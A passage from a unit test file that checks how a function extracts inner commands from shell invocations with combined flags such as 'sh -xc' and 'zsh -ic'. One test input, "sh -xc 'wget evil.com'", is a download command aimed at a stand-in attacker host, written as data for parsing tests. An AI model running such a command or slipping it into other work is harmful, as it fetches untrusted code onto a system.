...
describe('extractCommandLineFromShC', () => {
  it.each([
    ...
    // Combined single-dash flags containing -c
    {
      commandLine: "zsh -ic 'git-file-lint'",
      expected: ['git-file-lint'],
    },
    {
      commandLine: "bash -ci 'echo hello'",
      expected: ['echo hello'],
    },
    {
      commandLine: "sh -xc 'wget evil.com'",
      expected: ['wget evil.com'],
    },
    {
      commandLine: "sh -ixc 'echo ok && touch test'",
      expected: ['echo ok', 'touch test'],
    },
    {
      commandLine: "sh -icx 'echo ok'",
      expected: ['echo ok'],
    },

    // Long-form flags do not match as combined -c
    {
      commandLine: "sh --interactive 'echo hello'",
      expected: ["sh --interactive 'echo hello'"],
    },
